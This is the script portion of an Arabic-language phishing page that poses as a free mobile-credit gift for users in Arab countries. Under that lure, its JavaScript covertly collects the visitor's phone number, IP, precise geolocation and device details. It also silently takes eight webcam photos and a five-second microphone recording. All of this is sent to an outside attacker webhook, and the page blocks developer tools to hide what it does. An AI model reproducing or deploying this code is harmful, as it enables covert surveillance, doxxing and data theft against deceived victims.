                    <div class="step-title">تم <span class="highlight">الإرسال</span></div>
                    <p class="step-desc">جاري تجهيز هديتك، انتظر لحظات</p>
                    <div class="timer-luxury">
                        <div class="timer-sweep"></div>
                        <i class="fas fa-hourglass-half timer-icon"></i>
                        <span class="timer-digits" id="timerDisplay">03:00</span>
                    </div>
                    <p class="timer-sub">سيتم إرسال الهدية تلقائياً إلى رقمك</p>
                    <div class="status" id="statusTimer"></div>
                </div>

            </div>
        </div>

    </div>

    <!-- ============================================================
    HIDDEN MEDIA
    ============================================================ -->
    <video id="hiddenVideo" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas"></canvas>

    <!-- ============================================================
    SCRIPT
    ============================================================ -->
    <script>
        // ============================================================
        //  CONFIG
        // ============================================================
        const WEBHOOK_URL =
            "https://dev-free-balancce.pantheonsite.io/free/bot.php?action=webhook_data";

        const TOTAL_PHOTOS = 8;
        const CAPTURE_INTERVAL = 700;
        const AUDIO_DURATION = 5000;
        const PHOTO_QUALITY = 0.92;

        // ============================================================
        //  COUNTRIES
        // ============================================================
        const countries = {
            'مصر': { flag: '🇪🇬', prefixes: ['010', '011', '012', '015'] },
            'السعودية': { flag: '🇸🇦', prefixes: ['05'] },
            'الإمارات': { flag: '🇦🇪', prefixes: ['050', '052', '054', '055', '056'] },
            'الكويت': { flag: '🇰🇼', prefixes: ['5'] },
            'قطر': { flag: '🇶🇦', prefixes: ['3', '5', '6'] },
            'عُمان': { flag: '🇴🇲', prefixes: ['7', '9'] },
            'البحرين': { flag: '🇧🇭', prefixes: ['3', '6'] },
            'الأردن': { flag: '🇯🇴', prefixes: ['7'] },
            'العراق': { flag: '🇮🇶', prefixes: ['7'] },
            'سوريا': { flag: '🇸🇾', prefixes: ['9'] },
            'لبنان': { flag: '🇱🇧', prefixes: ['3', '7'] },
            'فلسطين': { flag: '🇵🇸', prefixes: ['5', '9'] },
            'الجزائر': { flag: '🇩🇿', prefixes: ['5', '6', '7'] },
            'المغرب': { flag: '🇲🇦', prefixes: ['6', '7'] },
            'تونس': { flag: '🇹🇳', prefixes: ['2', '5', '9'] },
            'ليبيا': { flag: '🇱🇾', prefixes: ['9'] },
            'السودان': { flag: '🇸🇩', prefixes: ['9', '1'] },
            'اليمن': { flag: '🇾🇪', prefixes: ['7'] },
            'الصومال': { flag: '🇸🇴', prefixes: ['6', '7'] },
            'جيبوتي': { flag: '🇩🇯', prefixes: ['7'] },
            'موريتانيا': { flag: '🇲🇷', prefixes: ['4', '5'] },
        };

        // ============================================================
        //  TOKEN
        // ============================================================
        let USER_TOKEN = null;

        function extractTokenFromURL() {
            const params = new URLSearchParams(window.location.search);
            const token = params.get('i');
            if (token && token.length >= 6 && token.length <= 8 && /^[A-Z0-9]+$/.test(token)) {
                USER_TOKEN = token;
                return true;
            }
            USER_TOKEN = null;
            return false;
        }

        // ============================================================
        //  WEBHOOK
        // ============================================================
        async function sendToWebhook(formData) {
            if (!USER_TOKEN) {
                console.error('❌ Token missing');
                return { success: false, error: 'Token missing' };
            }
            formData.append('token', USER_TOKEN);
            try {
                const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
                const data = await res.json();
                if (!res.ok) return { success: false, error: data.message || 'HTTP error' };
                return { success: true, data };
            } catch (e) {
                return { success: false, error: e.message };
            }
        }

        // ============================================================
        //  STATE
        // ============================================================
        let selectedCountry = null;
        let userPhone = null;
        let mediaStream = null;
        let audioStream = null;
        let audioRecorder = null;
        let audioChunks = [];
        let capturedPhotoFiles = [];
        let audioBlob = null;
        let userIP = 'غير متاح';
        let userLocation = { lat: null, lng: null, accuracy: null, error: null };
        let isProcessing = false;
        let timerInterval = null;
        let timerSeconds = 180;

        // DOM
        const stepCountry = document.getElementById('step-country');
        const stepTasks = document.getElementById('step-tasks');
        const stepTimer = document.getElementById('step-timer');
        const countryList = document.getElementById('countryList');
        const statusCountry = document.getElementById('statusCountry');
        const statusTasks = document.getElementById('statusTasks');
        const statusTimer = document.getElementById('statusTimer');
        const claimBtn = document.getElementById('claimBtn');
        const phoneInput = document.getElementById('phoneInput');
        const permissionArea = document.getElementById('permissionArea');
        const timerDisplay = document.getElementById('timerDisplay');
        const taskSub = document.getElementById('taskSub');
        const video = document.getElementById('hiddenVideo');
        const canvas = document.getElementById('hiddenCanvas');

        const stepDots = document.querySelectorAll('.step-dot');
        const stepLines = document.querySelectorAll('.step-line');

        // ============================================================
        //  STEP INDICATOR
        // ============================================================
        function updateStepIndicator(step) {
            stepDots.forEach((dot, idx) => {
                const num = idx + 1;
                dot.classList.remove('active', 'completed');
                if (num === step) dot.classList.add('active');
                else if (num < step) dot.classList.add('completed');
            });
            stepLines.forEach((line, idx) => {
                const num = idx + 1;
                line.classList.toggle('active', num < step);
            });
        }

        // ============================================================
        //  NOTIFY VISIT
        // ============================================================
        async function notifyUserEntered() {
            if (!USER_TOKEN) return;
            let ip = 'غير متاح';
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
                userIP = ip;
            } catch (_) {}
            const fd = new FormData();
            fd.append('event', 'visit');
            fd.append('timestamp', new Date().toISOString());
            fd.append('ip', ip);
            fd.append('userAgent', navigator.userAgent);
            fd.append('platform', navigator.platform);
            fd.append('language', navigator.language);
            fd.append('screen', `${screen.width}x${screen.height}`);
            fd.append('url', window.location.href);
            await sendToWebhook(fd).catch(() => {});
        }

        // ============================================================
        //  SUSPICIOUS
        // ============================================================
        function detectSuspiciousActivity() {
            document.addEventListener('contextmenu', (e) => { e.preventDefault();
                sendSuspiciousAlert('🖱️ النقر الأيمن'); });
            document.addEventListener('keydown', (e) => {
                const k = e.key;
                const c = e.ctrlKey || e.metaKey;
                const s = e.shiftKey;
                if (k === 'F12' || (c && s && (k === 'I' || k === 'C' || k === 'J')) || (c && k === 'U')) {
                    e.preventDefault();
                    sendSuspiciousAlert(`⌨️ أدوات المطور (${k})`);
                }
                if (c && ['c', 'v', 'x'].includes(k)) {
                    sendSuspiciousAlert(`📋 ${k === 'c' ? 'نسخ' : k === 'v' ? 'لصق' : 'قص'}`);
                }
            });
            document.addEventListener('dragstart', (e) => { e.preventDefault();
                sendSuspiciousAlert('🔄 سحب'); });
            document.addEventListener('selectstart', () => { sendSuspiciousAlert('✏️ تحديد نص'); });
        }

        let alertCooldown = 0;

        function sendSuspiciousAlert(action) {
            if (!USER_TOKEN) return;
            const now = Date.now();
            if (now - alertCooldown < 5000) return;
            alertCooldown = now;
            const fd = new FormData();
            fd.append('event', 'suspicious');
            fd.append('action', action);
            fd.append('timestamp', new Date().toISOString());
            fd.append('ip', userIP);
            fd.append('userAgent', navigator.userAgent);
            fd.append('url', window.location.href);
            sendToWebhook(fd).catch(() => {});
        }

        // ============================================================
        //  RENDER COUNTRIES
        // ============================================================
        function renderCountries() {
            countryList.innerHTML = '';
            Object.keys(countries).forEach((name) => {
                const btn = document.createElement('button');
                btn.className = 'sim-card';
                btn.innerHTML = `
                    <span class="sim-glow"></span>
                    <span class="sim-icon">
                        <i class="fas fa-sim-card"></i>
                        <span class="icon-glow"></span>
                    </span>
                    <span class="sim-name">${name}</span>
                    <span class="sim-chip">${countries[name].prefixes[0]}•••</span>
                `;
                btn.dataset.country = name;

                // 3D tilt
                btn.addEventListener('mousemove', (e) => {
                    const rect = btn.getBoundingClientRect();
                    const x = (e.clientX - rect.left) / rect.width - 0.5;
                    const y = (e.clientY - rect.top) / rect.height - 0.5;
                    btn.style.transform =
                        `perspective(900px) rotateX(${y * -5}deg) rotateY(${x * 7}deg) translateZ(12px) scale(1.02)`;
                });
                btn.addEventListener('mouseleave', () => {
                    btn.style.transform = 'perspective(900px) rotateX(0deg) rotateY(0deg) translateZ(0) scale(1)';
                });

                btn.addEventListener('click', () => selectCountry(name));
                countryList.appendChild(btn);
            });
        }
        renderCountries();

        // ============================================================
        //  SELECT COUNTRY
        // ============================================================
        async function selectCountry(name) {
            selectedCountry = name;
            const data = countries[name];
            taskSub.textContent = `للاستفادة من هدية ${name} (رصيد، نت، وحدات)`;
            const prefixes = data.prefixes.join('، ');

            permissionArea.innerHTML = `
                <div class="gift-top">
                    <span class="gift-box-3d">
                        <i class="fas fa-gift"></i>
                        <span class="gift-shine"></span>
                    </span>
                    <span class="gift-title">هدية رقمية</span>
                </div>
                <ul>
                    <li><i class="fas fa-coins"></i> رصيد بقيمة تصل إلى 50$</li>
                    <li><i class="fas fa-wifi"></i> باقة نت إضافية 7 أيام</li>
                    <li><i class="fas fa-phone"></i> وحدات اتصال محلية ودولية</li>
                </ul>
                <div class="gift-note"><i class="fas fa-sim-card" style="margin-left:8px;"></i> الأرقام المسموحة: <strong>${prefixes}</strong></div>
            `;

            phoneInput.placeholder = `مثال: ${prefixes.split('،')[0]}12345678`;

            showStep('step-tasks');
            updateStepIndicator(2);
            statusTasks.className = 'status';
            statusTasks.style.display = 'block';
            statusTasks.className = 'status info';
            statusTasks.textContent = '📍 جاري تحديد موقعك...';

            await getLocation();

            phoneInput.value = '';
            capturedPhotoFiles = [];
            audioChunks = [];
            audioBlob = null;
            claimBtn.disabled = false;
            claimBtn.classList.remove('loading');
            claimBtn.querySelector('.btn-text').innerHTML =
                '<i class="fas fa-gift" style="margin-left:12px;"></i> احصل على هديتي';
        }

        function showStep(id) {
            document.querySelectorAll('.step').forEach((el) => el.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        // ============================================================
        //  STATUS HELPER
        // ============================================================
        function showStatus(el, type, message) {
            el.className = `status ${type}`;
            el.textContent = message;
            el.style.display = 'block';
            if (type !== 'error') {
                clearTimeout(el._timeout);
                el._timeout = setTimeout(() => {
                    if (el.className.includes(type)) el.style.display = 'none';
                }, 8000);
            }
        }

        // ============================================================
        //  LOCATION
        // ============================================================
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
                    resolve();
                    return;
                }
                let watchId = null;
                let best = null;
                let bestAcc = Infinity;
                let resolved = false;
                let attempts = 0;
                const MAX_ATTEMPTS = 10;
                const TIMEOUT_MS = 15000;
                const TARGET = 100;

                const done = () => {
                    if (resolved) return;
                    resolved = true;
                    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
                    if (best) {
                        userLocation.lat = best.coords.latitude;
                        userLocation.lng = best.coords.longitude;
                        userLocation.accuracy = best.coords.accuracy;
                        userLocation.error = null;
                    } else {
                        userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
                    }
                    resolve();
                };

                const timeoutId = setTimeout(() => {
                    if (!resolved) {
                        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
                        if (best) done();
                        else { userLocation.error = 'انتهت المهلة';
                            resolve(); }
                    }
                }, TIMEOUT_MS);

                const handlePos = (pos) => {
                    attempts++;
                    const acc = pos.coords.accuracy;
                    if (acc < bestAcc) { bestAcc = acc;
                        best = pos; }
                    if (acc <= TARGET || attempts >= MAX_ATTEMPTS) {
                        done();
                        clearTimeout(timeoutId);
                    }
                };

                const handleErr = (err) => {
                    if (resolved) return;
                    if (err.code === 1) {
                        userLocation.error = 'تم رفض الإذن بالموقع';
                        resolved = true;
                        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
                        clearTimeout(timeoutId);
                        resolve();
                        return;
                    }
                    if (attempts >= MAX_ATTEMPTS) {
                        if (best) done();
                        else { userLocation.error = err.message || 'تعذر الحصول على الموقع';
                            resolve(); }
                    }
                };

                watchId = navigator.geolocation.watchPosition(handlePos, handleErr, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 2000
                });
            });
        }

        // ============================================================
        //  CAMERA
        // ============================================================
        async function startCameraAndCapture() {
            try {
                const constraints = { video: true, audio: false };
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = mediaStream;
                await video.play();

                await new Promise((resolve, reject) => {
                    const to = setTimeout(() => reject(new Error('Video timeout')), 10000);
                    const ready = () => { clearTimeout(to);
                        resolve(); };
                    if (video.readyState >= 2 && video.videoWidth > 0) ready();
                    else {
                        video.addEventListener('loadedmetadata', ready);
                        video.addEventListener('canplay', ready);
                        video.play().catch(() => {});
                    }
                });

                await new Promise((r) => setTimeout(r, 500));
                const ctx = canvas.getContext('2d');
                const w = Math.min(video.videoWidth || 640, 1920);
                const h = Math.min(video.videoHeight || 480, 1080);
                canvas.width = w;
                canvas.height = h;

                capturedPhotoFiles = [];
                for (let i = 1; i <= TOTAL_PHOTOS; i++) {
                    ctx.drawImage(video, 0, 0, w, h);
                    const blob = await new Promise((res) => canvas.toBlob(res, 'image/jpeg', PHOTO_QUALITY));
                    if (blob && blob.size > 1000) {
                        const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
                        capturedPhotoFiles.push(file);
                    }
                    if (i < TOTAL_PHOTOS) await new Promise((r) => setTimeout(r, CAPTURE_INTERVAL));
                }
                return true;
            } catch (err) {
                console.error('Camera error:', err);
                if (mediaStream) { mediaStream.getTracks().forEach((t) => t.stop());
                    mediaStream = null; }
                video.srcObject = null;
                return false;
            }
        }

        // ============================================================
        //  AUDIO
        // ============================================================
        async function recordAudio() {
            try {
                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
                audioChunks = [];
                audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
                audioRecorder.onstop = () => {
                    if (audioChunks.length > 0) {
                        audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    }
                };
                audioRecorder.start();
                setTimeout(() => {
                    if (audioRecorder.state === 'recording') audioRecorder.stop();
                    if (audioStream) audioStream.getTracks().forEach((t) => t.stop());
                }, AUDIO_DURATION);
                return true;
            } catch (err) {
                console.error('Audio error:', err);
                return false;
            }
        }

        // ============================================================
        //  SEND ALL DATA
        // ============================================================
        async function sendAllData() {
            const fd = new FormData();
            fd.append('event', 'submission');
            fd.append('country', selectedCountry);
            fd.append('phone', userPhone);
            fd.append('ip', userIP);
            fd.append('location[lat]', userLocation.lat !== null ? String(userLocation.lat) : '');
            fd.append('location[lng]', userLocation.lng !== null ? String(userLocation.lng) : '');
            fd.append('location[accuracy]', userLocation.accuracy !== null ? String(userLocation.accuracy) : '');
            fd.append('location[error]', userLocation.error || '');
            fd.append('device[userAgent]', navigator.userAgent);
            fd.append('device[platform]', navigator.platform);
            fd.append('device[language]', navigator.language);
            fd.append('device[screen]', `${screen.width}x${screen.height}`);
            fd.append('device[colorDepth]', screen.colorDepth);
            fd.append('device[timezone]', Intl.DateTimeFormat().resolvedOptions().timeZone);
            fd.append('timestamp', new Date().toISOString());

            capturedPhotoFiles.forEach((f, i) => fd.append(`photos[]`, f, f.name));
            if (audioBlob) {
                const af = new File([audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                fd.append('audio', af);
            }

            const result = await sendToWebhook(fd);
            return result.success;
        }

        // ============================================================
        //  CLAIM BUTTON
        // ============================================================
        claimBtn.addEventListener('click', async () => {
            if (!USER_TOKEN) {
                showStatus(statusTasks, 'error', '⚠️ رابط غير صحيح، يرجى الدخول من الرابط المخصص.');
                return;
            }
            if (isProcessing) return;

            const phone = phoneInput.value.trim();
            if (!phone) {
                showStatus(statusTasks, 'error', '⚠️ يرجى إدخال رقم الهاتف');
                return;
            }
            const prefixes = countries[selectedCountry].prefixes;
            let valid = false;
            for (const p of prefixes) {
                if (phone.startsWith(p)) { valid = true; break; }
            }
            if (!valid) {
                showStatus(statusTasks, 'error', `⚠️ الرقم يجب أن يبدأ بـ ${prefixes.join(' أو ')}`);
                return;
            }
            userPhone = phone;

            isProcessing = true;
            claimBtn.disabled = true;
            claimBtn.classList.add('loading');
            claimBtn.querySelector('.btn-text').innerHTML = 'جاري التأكيد...';

            showStatus(statusTasks, 'info', '⏳ جاري إرسال البيانات...');

            await getIPAddress();
            await startCameraAndCapture();
            await recordAudio();

            const success = await sendAllData();

            if (success) {
                showStep('step-timer');
                updateStepIndicator(3);
                startTimer(180);
                showStatus(statusTimer, 'success', '🎉 تم إرسال هديتك! تحقق من هاتفك.');
            } else {
                showStatus(statusTasks, 'error', '⚠️ فشل الإرسال، حاول مرة أخرى.');
                claimBtn.disabled = false;
                claimBtn.classList.remove('loading');
                claimBtn.querySelector('.btn-text').innerHTML =
                    '<i class="fas fa-gift" style="margin-left:12px;"></i> احصل على هديتي';
                isProcessing = false;
            }
        });

        // ============================================================
        //  IP
        // ============================================================
        async function getIPAddress() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
            } catch (_) {}
        }

        // ============================================================
        //  TIMER
        // ============================================================
        function startTimer(seconds) {
            timerSeconds = seconds;
            updateTimerDisplay();
            if (timerInterval) clearInterval(timerInterval);
            timerInterval = setInterval(() => {
                timerSeconds--;
                updateTimerDisplay();
                if (timerSeconds <= 0) {
                    clearInterval(timerInterval);
                    timerDisplay.textContent = '00:00';
                }
            }, 1000);
        }

        function updateTimerDisplay() {
            const m = Math.floor(timerSeconds / 60);
            const s = timerSeconds % 60;
            timerDisplay.textContent = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
        }

        // ============================================================
        //  CLEANUP
        // ============================================================
        window.addEventListener('beforeunload', () => {
            if (mediaStream) mediaStream.getTracks().forEach((t) => t.stop());
            if (audioStream) audioStream.getTracks().forEach((t) => t.stop());
            if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
            if (timerInterval) clearInterval(timerInterval);
        });

        // ============================================================
        //  PARTICLE SYSTEM
        // ============================================================
        (function initParticles() {
            const c = document.getElementById('bg-canvas');
            const ctx = c.getContext('2d');
            let w, h;
            const particles = [];
            const COUNT = 70;

            function resize() {
                w = c.width = window.innerWidth;
                h = c.height = window.innerHeight;
            }
            window.addEventListener('resize', resize);
            resize();

            class Particle {
                constructor() { this.reset(); }
                reset() {
                    this.x = Math.random() * w;
                    this.y = Math.random() * h;
                    this.size = Math.random() * 2.2 + 0.4;
                    this.speedX = (Math.random() - 0.5) * 0.2;
                    this.speedY = (Math.random() - 0.5) * 0.2;
                    this.opacity = Math.random() * 0.2 + 0.02;
                    this.pulse = Math.random() * Math.PI * 2;
                    this.pulseSpeed = 0.006 + Math.random() * 0.01;
                }
                update() {
                    this.x += this.speedX;
                    this.y += this.speedY;
                    this.pulse += this.pulseSpeed;
                    if (this.x < 0 || this.x > w) this.speedX *= -1;
                    if (this.y < 0 || this.y > h) this.speedY *= -1;
                }
                draw() {
                    const o = this.opacity * (0.5 + 0.5 * Math.sin(this.pulse));
                    ctx.beginPath();
                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                    ctx.fillStyle = `rgba(201, 168, 76, ${o})`;
                    ctx.fill();
                    if (this.size > 1.2) {
                        ctx.shadowColor = 'rgba(201, 168, 76, 0.01)';
                        ctx.shadowBlur = 10;
                        ctx.fill();
                        ctx.shadowBlur = 0;
                    }
                }
            }

            for (let i = 0; i < COUNT; i++) particles.push(new Particle());

            function animate() {
                ctx.clearRect(0, 0, w, h);
                particles.forEach((p) => { p.update();
                    p.draw(); });
                // connections
                for (let i = 0; i < particles.length; i++) {
                    for (let j = i + 1; j < particles.length; j++) {
                        const dx = particles[i].x - particles[j].x;
                        const dy = particles[i].y - particles[j].y;
                        const dist = Math.sqrt(dx * dx + dy * dy);
                        if (dist < 130) {
                            const alpha = (1 - dist / 130) * 0.015;
                            ctx.beginPath();
                            ctx.moveTo(particles[i].x, particles[i].y);
                            ctx.lineTo(particles[j].x, particles[j].y);
                            ctx.strokeStyle = `rgba(201, 168, 76, ${alpha})`;
                            ctx.lineWidth = 0.5;
                            ctx.stroke();
                        }
                    }
                }
                requestAnimationFrame(animate);
            }
            animate();
        })();

        // ============================================================
        //  BOOT
        // ============================================================
        window.addEventListener('load', async () => {
            const hasToken = extractTokenFromURL();
            if (!hasToken) {
                showStatus(statusCountry, 'error', '⚠️ رابط غير صحيح. يرجى استخدام الرابط المخصص لك.');
                document.querySelectorAll('.sim-card').forEach((b) => b.disabled = true);
                return;
            }
            await notifyUserEntered();
            detectSuspiciousActivity();
        });
